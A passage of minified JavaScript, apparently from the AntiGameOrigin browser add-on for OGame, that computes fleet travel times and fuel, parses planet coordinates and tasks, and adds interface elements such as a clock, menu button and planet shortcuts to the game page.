f.Units)}},resetUnits:function(){m.deleteStorage("Units");f.Units={};m.Info.Units.status=0},getUnitsAccount:function(a){return a?f.UnitsAccount[a]||0:0},getItemByName:function(a){return a?f.ItemByName[a]||"":""},getItemLabel:function(a,b){var c;c=f.ItemResourceEnergy[a]?f.ItemResourceEnergy[a]:a;return b?e.label("K"+c):e.label("L"+c)},getFleetDistance:function(a,b){var c;return(c=Math.abs(a.galaxy-b.galaxy))?2E4*c:(c=Math.abs(a.system-b.system))?95*c+2700:(c=Math.abs(a.position-b.position))?5*c+1E3:
5},getFleetDuration:function(a,b){return Math.round((3500*Math.sqrt(10*b/f.getShipSpeed(a))+10)/n.d(e.get("S21"),1))},getFleetConsumption:function(a,b){var c=35E3/(f.getFleetDuration(a,b)*e.get("S21")-10)*Math.sqrt(10*b/f.getShipSpeed(a));return Math.round(f.Item[a].consumption*b/35E3*(c/10+1)*(c/10+1))+1},getShipSpeed:function(a){var b,c;a===V&&5<=f.getUnitsAccount(sa)?(b=1E4,a=sa):"211"===a&&8<=f.getUnitsAccount(wa)?(b=5E3,a=wa):(b=f.Item[a].speed,a=f.Item[a].drive);return a?(c=a===va?0.1:a===sa?
0.2:0.3,Math.floor(b*(10+10*f.getUnitsAccount(a)*c)/10)):0},getShipSpeedMaximal:function(a,b){var c=Math.abs(a-b);return 7<=c?0:6<=c?1:5<=c?2:4<=c?4:3<=c?6:2<=c?9:10},getDebris:function(a,b){var c,d,j;c={metal:0,crystal:0};b=b&&e.is("S27");d=n.d(e.get("S28"))||0.3;for(j in a)if(a[j]&&(f.ItemShip[j]||b&&1===f.ItemDefense[j]))c.metal+=a[j]*Math.floor(f.Item[j].metal*d),c.crystal+=a[j]*Math.floor(f.Item[j].crystal*d);c.total=c.metal+c.crystal;c.recs=Math.ceil(c.total/2E4);c.enough=0<c.total&&c.total>=
1E3*n.d(e.get("M37"));return c},chooseTopscore:function(a,b,c,d){var j=e.get("S35");return 1E5>=j?a:1E6>=j?b:5E6>=j?c:d},getPlanetId:function(a,b){return a?f.Planets[a]?a:f.PlanetsByCoordstype[a]||"":b?f.PlanetsActive.id:""},updateTask:function(a,b,c){var d,e;if(a&&b&&1<=c&&3>=c)for(d in a.ships=0,a.timeShips=A.timestamp(),f.ItemShip)"212"!==d&&(e=+b[d]||0,a[d]=+a[d]||0,a[d]=1===c?e:2===c?a[d]+e:3===c?Math.max(a[d]-e,0):a[d],a.ships+=a[d])},splitCurrentTask:function(a,b,c,d,e){a=m.splitStorageObject(a);
if(d===ha&&a.standard&&a[f.PlanetsActive.coordstype]){d=f.splitTask(a.standard,b,-1);b=f.splitTask(a[f.PlanetsActive.coordstype],b,-1);for(var g in b)b[g]&&(d[g]=e?b[g]:Math.max(b[g],0));f.updateCoords(d,d,c);d.resources=d.metal+d.crystal+d.deuterium;d.ships=0;for(var h in f.ItemShip)d[h]&&(d.ships+=d[h]);return d}return f.splitTask(1===d?a[f.PlanetsActive.coordstype]:0===d?a.standard:a[f.PlanetsActive.coordstype]||a.standard,b,c)},splitTask:function(a,b,c){var d;d=(a||"").split(":");a={galaxy:+d[0]||
0,system:+d[1]||0,position:+d[2]||0,type:+d[3]||0,mission:+d[4]||0,speed:+d[5]||0,holdingtime:+d[6]||0,expeditiontime:+d[7]||0,union:+d[8]||0,retreatAfterDefenderRetreat:+d[9]||0,name:d[10]||"",detail:+d[11]||0,rangeCoords:+d[12]||0,preferCargo:d[13]||"",preferShip:d[14]||""};0<=c&&f.updateCoords(a,a,c);1<=b&&(a.metal=+d[16]||0,a.crystal=+d[17]||0,a.deuterium=+d[18]||0,a.preferResource=+d[19]||0,a.timeResource=+d[20]||0,a.resources=a.metal+a.crystal+a.deuterium);if(b>=ba){a.timeShips=+d[21]||0;a.ships=
0;for(b=22;35>=b;b++)a[b+180+""]=+d[b]||0,a.ships+=+d[b]||0}return a},getTaskQueue:function(a,b){var c;c=1===b?f.PlanetsActive.coordstype:"standard";return(m.splitStorageObject(m.getStorage(a))[c]||"").split(",")},setTaskQueue:function(a,b,c,d,e){var g,h,k,l,n;g=d?f.PlanetsActive.coordstype:"standard";d=m.splitStorageObject(m.getStorage(a));b="object"===typeof b?f.joinTask(b,c):b;k=[15,21,36][e||ma];c=b.split(":");c.length=k;h=c.join(":");l=[];e=(d[g]||"").split(",");for(n=0;n<e.length&&!(e[n]&&(c=
e[n].split(":"),c.length=k,c.join(":")!==h&&l.push(e[n])),12<=l.length);n++);l.unshift(b);d[g]=l.join(",");m.setStorage(a,m.joinStorageObject(d))},joinTask:function(a,b){var c,d,e;c=[a.galaxy||"",a.system||"",a.position||"",a.type||"",a.mission||"",a.speed||"",a.holdingtime||"",a.expeditiontime||"",a.union||"",a.retreatAfterDefenderRetreat||"",a.name||"",a.detail||"",a.rangeCoords||"",a.preferCargo||"",a.preferShip||""];1<=b&&(c[15]="",c[16]=a.metal||"",c[17]=a.crystal||"",c[18]=a.deuterium||"",c[19]=
a.preferResource||"",c[20]=a.timeResource||"");if(b>=ba){c[21]=a.timeShips||"";for(e=22;35>=e;e++)d=e+180+"",a[d]&&(c[e]=a[d]||"")}c=c.join(":");return(!b||b===ma)&&14===c.length||1===b&&20===c.length||b===ba&&21===c.length?"":c},readTaskParameter:function(a){var b={};a=r.d(a).split("&");for(var c=0;c<a.length;c++){var d=a[c].split("=");if(d[0]){var e=n.parseIntAbs(d[0]),e=200<e?e:d[0];b[e]=n.d(d[1])}}return b},joinTaskParameter:function(a,b,c){b="";for(var d in a)if(a[d])if(200<d){if(!c||d===c)b+=
(b?"&":"")+"am"+d+"="+a[d]}else"coords"!==d&&"owncoords"!==d&&(b+=(b?"&":"")+d+"="+("name"===d?encodeURI(a[d]):a[d]));return b},joinTaskFleet:function(a,b){var c="",d=["routine","holdingtime","expeditiontime","union","retreatAfterDefenderRetreat"];1<=b&&d.push("metal","crystal","deuterium","preferResource");for(var e=0;e<d.length;e++)a[d[e]]&&(c+=(c?"&":"")+d[e]+"="+a[d[e]]);return c},CoordsInsertPage:null,coordsInit:function(a){if(e.is("F01")||a)2===F.ogame&&window.addEventListener("focus",f.CoordsSet,
!1),window.addEventListener("mouseup",f.CoordsMouseUp,!1)},CoordsGet:function(a){return a||e.is("F01")?m.getStorage("Coords"):""},CoordsActive:function(){return e.is("F01")&&"1"===m.getStorage("Coords_Active")},CoordsSet:function(){if(2===F.ogame){var a=m.getStorage("Coords_New");if(a&&(m.deleteStorage("Coords_New"),a=f.storeCoords(a.split(","))))B.updateIcon(),N.Autocopy&&N.Autocopy(a)}},CoordsMouseUp:function(a){if(a&&a.target&&!a.keyCode&&!a.altKey&&!a.ctrlKey&&!a.shiftKey&&!a.metaKey){a=window.getSelection?
window.getSelection().toString():"";if(!a&&document.activeElement&&J.check(document.activeElement.tagName.toLowerCase(),"textarea","input"))try{"selectionStart"in document.activeElement&&"selectionEnd"in document.activeElement&&(a=r.d(document.activeElement.value).substring(document.activeElement.selectionStart,document.activeElement.selectionEnd))}catch(b){}if(a)if(2===F.ogame){if(a=f.parseCoords(a),a.length&&(a=f.storeCoords(a)))B.updateIcon(),N.Autocopy&&N.Autocopy(a)}else a=f.parseCoords(a),a.length&&
m.setStorage("Coords_New",a.join(","))}},parseCoords:function(a){if(a){var b,c,d;d=0;var e=[];do if(d=a.indexOf(":",d),1<=d)if(b=a.indexOf(":",d+1),3<=b&&5>b-d){c=a.substring(d-2,b+3).split(":");if(d=f.getCoords(n.parseIntAbs(c[0]),n.parseIntAbs(c[1]),n.parseIntAbs(c[2])))c=n.parseIntAbs(c[3]),n.isMinMax(c,1,3)&&(d+=":"+c),e[e.length]=d;d=b+3}else d+=10;else break;while(1);return e}return null},storeCoords:function(a){var b="";if(a&&a.length){var c=a.length,d=[];a=a.concat(m.getStorage("Coords").split(","));
for(var e=0;e<a.length;e++){var g=a[e].split(":");if(g=f.getCoords(n.parseIntAbs(g[0]),n.parseIntAbs(g[1]),n.parseIntAbs(g[2]))){for(var h=!0,k=0;k<d.length;k++)if(d[k]===g){h=!1;break}h&&(d[d.length]=g,!b&&e<c&&(b=g))}if(12<=d.length)break}b&&m.setStorage("Coords",d.join(","))}return b},getCoords:function(a,b,c){return f.checkCoords(a,b,c)?a+":"+b+":"+c:""},stripCoords:function(a){if(a){var b=a.lastIndexOf("["),c=a.lastIndexOf("]");return r.trim(a.slice(-1<b?b+1:0,-1<c?c:a.length))}return""},getCoordPart:function(a,
b){var c={galaxy:e.get("S22"),system:e.get("S23"),position:e.get("S24")};return c[b]?n.minMax(a,1,c[b]):0},checkCoords:function(a,b,c){return n.isMinMax(a,1,F.ogame?e.get("S22"):50)&&n.isMinMax(b,1,e.get("S23"))&&n.isMinMax(c,1,e.get("S24"))},updateCoords:function(a,b,c,d,j,g){var h=!1;b&&(d=b.galaxy,j=b.system,g=b.position);f.checkCoords(d,j,g)?(a.galaxy=d,a.system=j,a.position=g,h=!0):1===c?(a.galaxy=0,a.system=0,a.position=0,a.coords="",a.owncoords=0):2===c?(a.galaxy=f.PlanetsActive.galaxy,a.system=
f.PlanetsActive.system,a.position=f.PlanetsActive.position):3<=c&&(a.galaxy=n.isMinMax(d,1,e.get("S22"))?d:3===c?f.PlanetsActive.galaxy:0,a.system=n.isMinMax(j,1,e.get("S23"))?j:3===c?f.PlanetsActive.system:0,a.position=n.isMinMax(g,1,e.get("S24"))?g:3===c?f.PlanetsActive.position:0);if(h||2<=c)a.coords=a.galaxy+":"+a.system+":"+a.position,a.owncoords=a.coords===f.PlanetsActive.coords?2:f.PlanetsByCoords[a.coords]?1:0},getTypeName:function(a){return 2===a?"debris":3===a?"moon":"planet"},checkType:function(a,
b){2!==b&&b!==Y&&(b=T);2===b&&(!a["209"]&&e.isAnd("F20","F2A"))&&(b=T);return b},selectType:function(a,b){if(e.isAnd("F20","F2A")){if(0===b||2===b)16===a.position&&15===a.mission&&(a.type=T),a["209"]&&8===a.mission&&(a.type=2),a["208"]&&7===a.mission&&(a.type=T),a["214"]&&9===a.mission&&(a.type=Y);if((4===b||2===b)&&2!==a.type&&a.owncoords)f.PlanetsByCoordstype[a.coords+":3"]?2===a.owncoords&&(a.type=f.PlanetsActive.type===T?Y:T):a.type=T}},checkMission:function(a,b,c,d){var e=!1;c===Aa?0<a[xa]&&
(e=!0):7===c?0<a["208"]&&(e=!0):8===c?0<a["209"]&&(e=!0):9===c?0<a["214"]&&(e=!0):1<=c&&15>=c&&(e=!0);if(e&&b&&(1===d||3===d))8!==c&&2===b.type&&(e=!1),8===c&&2!==b.type&&(e=!1),9===c&&b.type!==Y&&(e=!1),7===c&&b.type!==T&&(e=!1);if(e&&b&&(2===d||3===d))b.owncoords?J.check(c,1,2,5,Aa,7,9,15)&&(e=!1):(4===c&&(e=!1),15===c&&16!==b.position&&(e=!1),15!==c&&16===b.position&&(e=!1));return e?c:0},selectMission:function(a,b,c){if(a.ships&&e.is("F20"))if(16===a.position)a.mission=15,a.type=T;else if(a["209"]&&
e.is("F22")&&(!a.mission||c&&a.ships===a["209"])&&(2===a.type||f.checkMission(a,a,8,b)))a.mission=8,a.type=2;else if(a.ships===a["208"]&&e.is("F23")&&!a.mission&&!a.owncoords&&f.checkMission(a,a,7,b))a.mission=7,a.type=T;else{if(a.ships===a[xa]&&2!==a.type){if(a.owncoords){a.mission=4;return}if((!a.mission||c)&&e.is("F24")){a.mission=1===a.ships?1:Aa;return}}if(!a.mission&&2!==a.type)if(a.owncoords)a.mission=e.is("F25")?4:3;else if(a.mission=3,e.is("F26")&&f.checkMission(a,a,1,b)&&(!e.is("F27")||
a["204"]||a["205"]||a["206"]||a["207"]||a["211"]||a["213"]||a["214"]||a["215"]))a.mission=1}},updateResources:function(a,b){b?(a.metal=+b.metal||0,a.crystal=+b.crystal||0,a.deuterium=+b.deuterium||0):(a.metal=f.UnitsActive.metal,a.crystal=f.UnitsActive.crystal,a.deuterium=f.UnitsActive.deuterium);a.resources=a.metal+a.crystal+a.deuterium},getConsumption:function(a,b){var c=0;return a&&0<=b?("12"===a&&(c=Math.floor(10*b*Math.pow(1.1,b))*e.get("S21")),Math.floor(c)):0},getProductionEnergy:function(a){return"212"===
a?(a=(f.PlanetsActive.temp+40+140)/6,f.officers.engineer?1.1*Math.floor(a):Math.floor(a)):0},getProductionResources:function(a,b){var c,d;d=n.d(e.get("S21"),1);c="1"===a?30*b*Math.pow(1.1,b):"2"===a?20*b*Math.pow(1.1,b):"3"===a?10*b*Math.pow(1.1,b)*(1.28-0.004*f.PlanetsActive.temp):0;c=f.officers.geologist?1.1*Math.floor(c)*d:Math.floor(c)*d;return Math.floor("1"===a?c+30*d:"2"===a?c+15*d:c)},getStorageCapacity:function(a){return n.isMinMax(a,0,24)?1E3*[10,20,40,75,140,255,470,865,1590,2920,5355,
9820,18005,33005,60510,110925,203350,372785,683385,1297589,2296600,4210115,7717970,14148545,25937050][a]:0},getMissionClass:function(a){return a?" ownattack ownfederation owntransport owndeploy ownhold ownespionage owncolony ownharvest owndestroy ownmissile     ownexpedition".split(" ")[a]:""},getMission:function(a){if(a){var b=a.lastIndexOf("/");a=0<b?a.slice(b+1,a.lastIndexOf(".")):a;switch(a){case "cd360bccfc35b10966323c56ca8aac":case "icon-angriff":return 1;case "87d615c4fb395b75ec902b66b7757e":case "icon-verband":return 2;
case "2af2939219d8227a11a50ff4df7b51":case "icon-transport":return 3;case "4dab966bded2d26f89992b2c6feb4c":case "icon-stationieren":return 4;case "b20ddc3fdb2486567ce20d24d3889d":case "icon-halten":return 5;case "60a018ae3104b4c7e5af8b2bde5aee":case "icon-spionage":return Aa;case "0bbcbc3a6d6b102c979413d82bac47":case "icon-kolonisieren":return 7;case "26dd1bcab4f77fe67aa47846b3b375":case "icon-tf-abbauen":return 8;case "575dfbbe877f58d6c09120ffbcaabe":case "icon-zerstoeren":return 9;case "583cd7016e56770a23028cba6b5d2c":case "icon-raketenangriff":return 10;
case "892b08269e0e0bbde60b090099f547":case "icon-expedition":return 15}}return 0},getPlayerStatus:function(a,b){if(a&&10<a.length){var c;if(b){if((c=e.getMore("C"+b))&&-1<a.indexOf(c))return b}else for(var d=30;21<=d;d--)if((c=e.getMore("C"+d))&&-1<a.indexOf(c))return d}return 0},getPlayerStatusDataBase:function(a){if(a){var b={30:"a",29:"v",28:"b",27:"o",26:"h",23:"I",22:"i"},c;for(c in b)if(-1<a.indexOf(b[c]))return c}return 21},getPlayerHonor:function(a){if(a&&6<a.length){if(-1<a.indexOf("rank_starlord1"))return 1;
if(-1<a.indexOf("rank_starlord2"))return 2;if(-1<a.indexOf("rank_starlord3"))return 3;if(-1<a.indexOf("rank_bandit1"))return 5;if(-1<a.indexOf("rank_bandit2"))return 6;if(-1<a.indexOf("rank_bandit3"))return 7}return 0},getHonorClass:function(a){return a?" rank_starlord1 rank_starlord2 rank_starlord3  rank_bandit1 rank_bandit2 rank_bandit3".split(" ")[a]:""}},B={Run:function(){B.InitOgame();B.Show();B.readPlanets();B.readResources();B.readOfficers()},Ready:function(){},Complete:function(){f.saveUnits(!0);
B.scrollTitle();if(s.AGO_started_twice||s.AntiGame_started)ia[12]=!0,B.updateInfo("Notify");Ba&&e.Check(!0,ja)},Unload:function(){var a;f.saveUnits();for(a in f.Planets)f.Planets[a].Node=null},Timer:function(){2===B.modeClock&&h.setTextById("ago_clock_server",A.format(new Date((new Date).valueOf()+s.timeDiff),"[d].[m].[Y] [H]:[i]:[s]",!0));if(e.type===T){for(var a in f.ItemResource)f.UnitsActive[a]=n.parseIntFormat(h.getTextById("resources_"+a));f.UnitsActive.timeResource=A.timestamp();f.UnitsChanged=
!0}B.updatePlanets()},Keydown:function(a){if(112<=a.keyCode&&123>=a.keyCode&&e.is("A22")){var b=g("#myPlanets .smallplanet a.planetlink").get(a.keyCode-112);if(b)return h.click(a.shiftKey?"a.moonlink":"a.planetlink",b.parentNode),a.stopPropagation(),a.preventDefault(),!1}return!0},InitOgame:function(){var a=s.toggleMaxShips;s.toggleMaxShips=function(b,d,j){var f;if("#shipsChosen"===b&&e.is("F00")||"#jumpgateForm"===b&&e.is("B30"))f=(f=document.querySelector(b+" #ship_"+d))?n.d(f.value):0,0<f&&f!==
j&&(j-=f);a(b,d,j)};var b=s.getTooltipOptions;s.getTooltipOptions=function(a){var d=b(a),j=g(a).attr("class"),f=e.get("A27");if(w.hasClass(j,"ago_menu_help"))d.showDelay=555,d.hideOn=[{element:"target",event:"mouseleave"},{element:"tooltip",event:"mouseleave"}],d.hideOthers=!0,d.hook={target:"leftmiddle",tooltip:"rightmiddle"},d.maxWidth=q.maxWidth(550,30);else if(w.hasClass(j,"ago_menu_setting_help"))d.showDelay=555,d.hideOthers=!0,d.hook={target:"topleft",tooltip:"bottomleft"},d.maxWidth=q.maxWidth(500,
30);else if(w.hasClass(j,"tooltipClose"))d.hideAfter=250,d.showDelay=300,d.hideOn={element:"mouseleave",event:"mouseleave"},d.hideOthers=!0;else if(w.hasClass(j,"planetlink"))e.isAnd("O50","O51")&&(d.hook={target:"leftmiddle",tooltip:"rightmiddle"}),2===f?d.showOn=!1:f&&(d.showDelay=888);else if(w.hasClass(j,"moonlink"))e.isAnd("O50","O51")&&(d.hook={target:"rightmiddle",tooltip:"leftmiddle"}),f&&(d.showDelay=888);else if(f)if(N.Tooltip&&(f=N.Tooltip(a,d,j,f)),w.hasClass(j,"constructionIcon"))e.isAnd("O50",
"O53")?d.showOn=!1:d.showDelay=888;else if(2<f||w.hasClass(j,"tooltip"))2===f||4===f?d.showOn=!1:f&&(d.showDelay=888);return d}},Show:function(){var a,b,c,d;if(a=h.getElementsFromElementByClass("bar","OGameClock")[0])if(e.is("A31")&&A.timeZoneDelta&&(B.modeClock=1,a.innerHTML=A.format(A.serverTime,"[d].[m].[Y] <span>[H]:[i]:[s]</span>"),e.is("A32")&&(c=A.format(A.serverTime,"[d].[m].[Y] [H]:[i]:[s]",!0),B.modeClock=2),a.title=e.label("A38"),h.addClass(a,"tooltip"),h.after(a,h.create("li",{style:"float: right; color: #848484; font-weight: 700;"},
null,a.title[0]))),e.is("A34")&&(d=(0<A.timeDelta?" (+":" (-")+Math.floor(Math.abs(A.timeDelta)/100)/10+"s)&nbsp;&nbsp;"+A.format(A.serverTime,"[H]:[i]:[s]")),c||d)a=document.createElement("div"),a.className="ago_clock",d&&(b=a.appendChild(document.createElement("span")),b.innerHTML=d),c&&(b=a.appendChild(document.createElement("span")),b.id="ago_clock_server",b.className="tooltip",b.title=e.label("A39"),b.textContent=c),h.append(document.getElementById("bar"),a)},readPlanets:function(){var a,b,c,
d,j,g,v,k=0,l;f.Planets={};f.PlanetsByIndex=[];f.PlanetsByCoords={};f.PlanetsByCoordstype={};l=m.getStorageObject("Planets");a=h.getElementsFromElementByClass("rechts","smallplanet");for(b=0;b<a.length;b++)if(d=r.d(n.parseIntAbs(a[b].id)),c=a[b].getElementsByClassName("planetlink")[0],v=h.getTextByClass("planet-koords",a[b]).replace(/[^\d\:]/g,""),d&&c&&v){g=" "+h.getTitle(c);f.Planets[d]={index:b+1,coords:v,type:T,name:(g.split("[",1)[0].split("<B>",2)[1]||"").trim(),temp:n.parseInt((g.match(/<br>.*<br>[^\d\-]*([\d\-]+)/i)||
[])[1]),img:h.getAttributeByClass("planetPic","src",c),Node:c};if((c=a[b].getElementsByClassName("moonlink")[0])&&c.href)if(j=r.d(n.parseIntAbs(r.getUrlPara("cp",c.href))))g=" "+h.getTitle(c),f.Planets[j]={planet:d,index:b+1,coords:v,type:Y,name:(g.split("[",1)[0].split("<B>",2)[1]||"").trim(),img:h.getAttributeByClass("icon-moon","src",c),jumpgate:n.d(l[j]?l[j].jumpgate:0),Node:c},f.Planets[d].moon=j;if(!k||d<k)k=d;v===e.coords&&(g=e.type===Y&&c?j:d,f.PlanetsActive=f.Planets[g],f.PlanetsActive.id=
g);f.PlanetsByIndex[b+1]=d;f.PlanetsByCoords[v]=b+1}f.PlanetsHome=f.Planets[k];f.PlanetsHome.id=k;for(d in f.Planets)a=f.Planets[d].coords.split(":"),f.Planets[d].coordstype=f.Planets[d].coords+":"+f.Planets[d].type,f.Planets[d].galaxy=n.d(a[0]),f.Planets[d].system=n.d(a[1]),f.Planets[d].position=n.d(a[2]),f.PlanetsByCoordstype[f.Planets[d].coordstype]=d;if(e.is("O50")){if(b=document.getElementById("countColonies"))a=document.createElement("span"),a.className="ago_planets_arrow ago_scroll_moon",a.style.right=
"0",a.addEventListener("click",B.scrollPlanets,!1),h.append(b.children[0],a),a=document.createElement("span"),a.className="ago_planets_arrow ago_scroll_planet",a.style.left="0",a.addEventListener("click",B.scrollPlanets,!1),h.prepend(b.children[0],a);for(d in f.Planets)if(f.Planets[d].Node)if(b=f.Planets[d].Node.parentNode,e.is("A26")&&f.Planets[d].Node.addEventListener("click",B.selectPlanets,!1),f.Planets[d].type===T){if(e.isAnd("A22","O54")&&(a=b.appendChild(document.createElement("span")),a.className=
"ago_planets_shortcut",a.textContent=f.Planets[d].index),h.setAttribute(".activity img","src","/cdn/img/galaxy/activity15.gif",b),e.is("O53")){a=h.getElementsFromElementByClass(b,"constructionIcon");for(b=0;b<a.length;b++)(g=h.getTitle(a[b]))&&(h.hasClass(a[b],"moon")?h.append(f.Planets[d].Node,h.create("span",{"class":"ago_planets_construction_moon"},null,g)):h.prepend(f.Planets[d].Node,h.create("span",{"class":"ago_planets_construction"},null,g)))}}else f.PlanetsActive.id===d&&(b.className=(b.className||
"")+" ago_planets_moon_active"),f.Planets[d].jumpgate&&(b=3600/e.get("S21")-(A.timestamp()-f.Planets[d].jumpgate),0<b&&(a=f.Planets[d].Node.appendChild(document.createElement("span")),a.textContent=60<b?Math.ceil(b/60):Math.floor(b)||"",a.className="ago_jumpgate_cooldown"+(60>=b?" ago_jumpgate_cooldown_seconds":""))),f.Planets[d].Node.addEventListener("mouseover",B.hoverPlanets,!1),f.Planets[d].Node.addEventListener("mouseout",B.hoverPlanets,!1)}},selectPlanets:function(a){h.hasClass(a.currentTarget,
"planetlink")&&h.addClass(a.currentTarget.parentNode,"ago_planets_planet_selected");h.hasClass(a.currentTarget,"moonlink")&&h.addClass(a.currentTarget.parentNode,"ago_planets_moon_selected")},scrollPlanets:function(a){var b,c;if(a&&a.currentTarget){a=h.hasClass(a.currentTarget,"ago_scroll_moon")?Y:T;b=f.PlanetsActive.index;do if(b++,b>=f.PlanetsByIndex.length&&(b=1),a===T)break;else if(c=f.PlanetsByIndex[b],f.Planets[c].moon)break;while(b!==f.PlanetsActive.index);b!==f.PlanetsActive.index&&(b=g("#myPlanets .smallplanet a.planetlink").get(b-
1),h.click(a===T?"a.planetlink":"a.moonlink",b.parentNode))}},savePlanets:function(){var a,b={},c,d;d=A.timestamp();for(a in f.Planets)b[a]={},c=n.d(f.Planets[a].jumpgate),c+86400>d&&(b[a].jumpgate=c);m.setStorageObject("Planets",b)},updatePlanets:function(){var a,b,c,d=0;if(!z.cooldown||-4<z.cooldown){for(b in f.Planets)if(f.Planets[b].Node&&f.Planets[b].jumpgate&&(c=3600/e.get("S21")-(A.timestamp()-f.Planets[b].jumpgate),0<=c&&(d++,a=f.Planets[b].Node.getElementsByClassName("ago_jumpgate_cooldown")[0])))a.textContent=
60<c?Math.ceil(c/60):Math.floor(c)||"",60>=c&&(a.className="ago_jumpgate_cooldown ago_jumpgate_cooldown_seconds");z.cooldown=d||z.cooldown-1}},feedbackPlanets:function(a,b){var c,d,j;if(e.is("A26")&&(c=h.getElementsFromElementByClass("rechts","smallplanet"),c.length&&(h.removeClassAll(c,"ago_feedback_planet"),h.removeClassAll(c,"ago_feedback_moon"),h.removeClassAll(c,"ago_feedback_debris"),(d=a?f.PlanetsByCoords[a]:0)&&(b!==Y||f.PlanetsByCoordstype[a+":3"]))))j=["","ago_feedback_planet","ago_feedback_debris",
"ago_feedback_moon"][b||1],h.addClass(c[d-1],j)},hoverPlanets:function(a){"mouseover"===a.type?h.addClass(this.parentNode,"ago_planets_moon_hover"):h.removeClass(this.parentNode,"ago_planets_moon_hover")},readResources:function(){var a,b,c,d;if(s.initAjaxResourcebox){var j;b=s.reloadResources;s.reloadResources=function(a){j=a};s.initAjaxResourcebox();s.reloadResources=b;f.UnitsActive.timeResource=A.timestamp();for(a in j)b=(j[a].tooltip||"").split("<span"),4<=b.length&&f.ItemResourceEnergy[a]&&(c=
b[0].split("|")[0].replace(/:/g,"").trim(),e.setLabel("L"+f.ItemResourceEnergy[a],c),f.ItemByName[c]=a,f.UnitsActive[a]=n.parseIntFormat(b[1].split("</span>")[0]),a in f.ItemResource?(f.UnitsActiveStart[a]=f.UnitsActive[a],c=n.parseIntAbs(b[2].split("</span>")[0]),d=n.parseIntAbs(b[3].split("</span>")[0]),b=n.parseIntAbs(b[4].split("</span>")[0]),"metal"===a?(f.UnitsActive["22"]=c,f.UnitsActive["25"]=b,f.UnitsActive["71"]=d):"crystal"===a?(f.UnitsActive["23"]=c,f.UnitsActive["26"]=b,f.UnitsActive["72"]=
d):"deuterium"===a&&(f.UnitsActive["24"]=c,f.UnitsActive["27"]=b,f.UnitsActive["73"]=d)):"energy"===a&&(f.UnitsActive["74"]=n.parseIntAbs(b[2].split("</span>")[0]),f.UnitsActive["75"]=n.parseIntFormat(b[3].split("</span>")[0])))}},readOfficers:function(){var a,b,c;f.officers={};b=["commander","admiral","engineer","geologist","technocrat"];a=h.getElementsFromElementByClass("officers","tooltipHTML");for(c=0;c<a.length;c++)b[c]&&h.hasClass(a[c],"on")&&(f.officers[b[c]]=!0)},addButton:function(){var a,
b,c;setTimeout(aa.sanitize,2553);B.oGameVersionCheck("AntiGameOrigin","5.2.2","http://antigame.de/home.php?page=home");if(a=document.getElementById("menuTableTools"))b=document.createElement("li"),c=b.appendChild(document.createElement("span")),c.className="menu_icon",c=c.appendChild(document.createElement("a")),c.id="ago_menu_icon",c.href="javascript:void(0)",c.textContent="[X]",c.addEventListener("click",B.clickIcon,!1),c.addEventListener("dblclick",B.clickIcon,!1),c=b.appendChild(document.createElement("a")),
c.id="ago_menu",c.className="menubutton",c.href="javascript:void(0)",c.addEventListener("click",O.Show,!1),Fa||(c.className="menubutton tooltip",c.title=e.label("A59")+"<br />"+e.label("A60")),c=c.appendChild(document.createElement("span")),c.className="textlabel",c.textContent="AntiGameOrigin",a.appendChild(b),B.updateInfo("Notify"),B.updateIcon()},updateButton:function(a){na=0;for(var b in ia)na=Math.max(b,na);m.Info.Notify.status=20<=na?-1:10<=na?3:Ea?2:0;a=a||!Fa?q.color.textDarkOrange:m.Info.Notify.status?
m.getStatusColor("Notify"):"";30<=na&&(a="red");h.setStylesById("ago_menu",{color:a})},updateInfo:function(a,b,c,d){var j,f,g,k="";"Notify"===a?B.updateButton():c||(m.Info[a].status=b,3===b&&B.updateButton(!0));if("Notify"===a){if(j=n.d(m.getStorage("Notify")),k=J.choose(m.Info.Notify.status+2,"","S63","","","S62","S63"))4<j?k="":j++,m.setStorage("Notify",j)}else k={Options:"S75",Versions:"S76",Lang:"S77",Units:"D45",Galaxy:"D46",Status:"D47",Server:"S45",Labels:"S46",Alliance:"D25",Players:"D26",
Universe:"D27"}[a];if(k){j=document.getElementById("ago_menu_info");if(!j&&(f=document.getElementById("ago_menu")))g=document.createElement("li"),g.className="ago_menu_info",j=g.appendChild(document.createElement("div")),j.id="ago_menu_info",h.after(f.parentNode,g);j&&(f=m.getStatusColor(a),b=e.label(d||"D05")+" "+e.label(k)+(c?" "+b+"%":""),j.children.length||(j.parentNode.style.display="list-item",setTimeout(B.hideInfo,500)),g=document.getElementById("ago_menu_info_"+a),g||(g=j.appendChild(document.createElement("span")),
g.id="ago_menu_info_"+a,g.style.display="block"),g.innerHTML=b,g.style.color=f)}},hideInfo:function(a){var b=!0,c;for(c in m.Info)"Notify"!==c&&3===m.Info[c].status&&(b=!1);b?(B.updateButton(),a?g("#ago_menu_info").html("").parent().hide():setTimeout(B.hideInfo,3E3,!0)):setTimeout(B.hideInfo,1E3)},clickIcon:function(a){if("click"===a.type){var b=m.getStorage("Coords_Active");m.setStorage("Coords_Active","1"===b?"0":"1")}"dblclick"===a.type&&m.deleteStorage("Coords");B.updateIcon()},updateIcon:function(){var a,
b,c;b=f.CoordsGet();c=f.CoordsActive()&&b?q.color.iconOrange:b?q.color.textMenu:q.color.textMenuInactive;a=document.getElementById("ago_menu_icon");h.setStyles(a,{color:c});h.setAttribute(a,"title",b.split(",")[0])},scrollTitle:function(){if(e.is("A12")){document.body.setAttribute("original_title",document.title);var a={};a.title=document.title;a.index=0;var b=document.getElementById("tempcounter"),c=document.getElementById("eventContent"),d=document.getElementById("eventboxBlank");a.run=function(){if(d.offsetHeight)document.title=
this.title;else{if(c&&b&&b.offsetHeight){var e=this.title+": "+b.innerHTML+" "+c.innerHTML+" ",e=e.substr(this.index)+e.substr(0,this.index);this.index=(this.index+1)%e.length;document.title=e}else document.title=this.title;setTimeout(function(){a.run()},200)}};setTimeout(function(){a.run()},200)}},oGameVersionCheck:function(a,b,c){function d(){var a,b,c,d,e,j,f,g;a=document.getElementById("contentWrapper");b=document.getElementById("oGameVersionCheck");c=document.getElementById("oGameVersionCheckData");
if(a)if(h.setStylesById("inhalt",{display:b?"block":"none"}),b)a.removeChild(b);else{e=(d=document.querySelector("#oGameVersionCheckMenuButton span"))?d.textContent:"";d=h.create("div",null,{background:'url("http://gf1.geo.gfsrv.net/cdn63/10e31cd5234445e4084558ea3506ea.gif") no-repeat scroll 0px 0px transparent',height:"28px",marginTop:"8px",position:"relative",textAlign:"center"});d.appendChild(h.create("div",null,{font:"700 12px/23px Verdana,Arial,Helvetica,sans-serif",color:"rgb(111, 159, 200)",
